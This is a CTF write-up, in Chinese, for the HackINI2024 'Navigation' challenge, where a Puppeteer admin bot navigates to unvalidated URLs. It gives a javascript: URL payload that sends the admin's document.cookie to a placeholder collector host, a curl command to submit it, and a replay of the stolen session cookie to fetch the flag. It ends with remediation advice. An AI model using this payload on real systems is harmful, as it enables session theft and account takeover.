# HackINI2024 Navigation

## 题目简述

服务接收一个 URL，并让 Puppeteer 管理员机器人访问。机器人先访问带有管理员密码的本地首页，使 incognito 会话取得管理员 session cookie，再无协议限制地执行 `page.goto(path)`。Cookie 被配置为 `httpOnly: false`，目标是用 `javascript:` URL 在当前页面上下文执行脚本并窃取管理员会话。

## 解题过程

机器人流程为：

```javascript
await page.goto(`http://localhost:3000/?admin=${adminPassword}`);
await page.goto(path);
```

首个请求把 `req.session.userRole` 设为 `admin`。因为第二个 `path` 完全可控，可以提交 JavaScript URL。准备一个能记录 HTTP 请求正文的受控接收端，然后提交：

```text
javascript:fetch('https://COLLECTOR/',{
  method:'POST',
  mode:'no-cors',
  body:document.cookie
})
```

实际表单值应写成一行：

```bash
curl 'http://TARGET/go_somewhere' \
  --data-urlencode \
  "path=javascript:fetch('https://COLLECTOR/',{method:'POST',mode:'no-cors',body:document.cookie})"
```

`javascript:` 代码在刚访问过的本地页面上下文中运行，而 session cookie 没有 HttpOnly 保护，所以接收端会拿到 `connect.sid=...`。用该 Cookie 请求 `/flag`：

```bash
curl 'http://TARGET/flag' \
  -H 'Cookie: connect.sid=CAPTURED_SESSION_VALUE'
```

服务端会从 session 恢复管理员角色并返回：

```text
shellmates{dONT_LET_PEOpl3_G0_wh3R3_you_DOnt_wAnT_tH3m_t0_6tb23c}
```

## 方法总结

管理员机器人不能把任意用户字符串直接交给浏览器导航。`javascript:` 不是普通网络地址，而是在当前 origin 中执行代码；再加上非 HttpOnly Cookie，就形成会话窃取。应限制协议为 HTTP/HTTPS、解析并校验目标 origin，禁用危险 scheme，并为认证 Cookie 设置 HttpOnly、Secure 和合适的 SameSite 属性。
